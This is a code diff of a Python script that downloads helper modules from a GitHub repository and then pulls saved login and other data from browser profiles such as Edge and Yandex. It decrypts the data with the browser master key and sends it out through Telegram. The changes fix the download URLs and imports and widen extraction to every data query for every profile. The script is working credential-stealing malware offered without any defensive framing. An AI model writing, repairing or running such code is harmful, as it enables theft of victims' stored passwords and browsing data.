@@ -3,8 +3,8 @@ import urllib.request
 
 # URLs to the raw files on GitHub
 urls = {
-    "utils.py": "https://github.com/invisibleghostshell-ux/WebExtractor/blob/main/utils.py",
-    "extractor.py": "https://github.com/invisibleghostshell-ux/WebExtractor/blob/main/extract.py"
+    "utils.py": "https://raw.githubusercontent.com/invisibleghostshell-ux/WebExtractor/main/utils.py",
+    "extractor.py": "https://raw.githubusercontent.com/invisibleghostshell-ux/WebExtractor/main/extractor.py"
 }
 
 # Download each file
@@ -12,16 +12,12 @@ for filename, url in urls.items():
     print(f"Downloading {filename} from {url}")
     urllib.request.urlretrieve(url, filename)
 
-
-import os
 import logging
 import asyncio
 import telegram
 from utils import get_master_key, convert_chrome_time
-from extract import get_data
-import asyncio
+from extractor import get_data
 import subprocess
-
 
 async def main():
     await process_and_send_data()
@@ -50,8 +46,6 @@ async def send_data_to_telegram(file_path, caption):
 
 home_dir = os.path.expanduser('~')
 
-
-
 # Define the browsers dictionary
 browsers = {
     'microsoft-edge': os.path.join(home_dir, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
@@ -64,7 +58,6 @@ browsers = {
     'yandex-browser': os.path.join(home_dir, 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data'),
     # Add other browsers here
 }
-
 
 data_queries = {
     'login_data': {
@@ -130,8 +123,7 @@ async def process_and_send_data():
 
             profiles = get_profiles(browser_path)
             for profile in profiles:
-                data_queries_for_browser = data_queries.get(browser, {})
-                for data_type_name, data_type in data_queries_for_browser.items():
+                for data_type_name, data_type in data_queries.items():
                     try:
                         data = get_data(browser_path, profile, master_key, data_type)
                         if data:
@@ -147,6 +139,3 @@ async def process_and_send_data():
 
 if __name__ == '__main__':
     result = subprocess.run(['python', '-c', 'import asyncio; asyncio.run(main())'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-
-
-
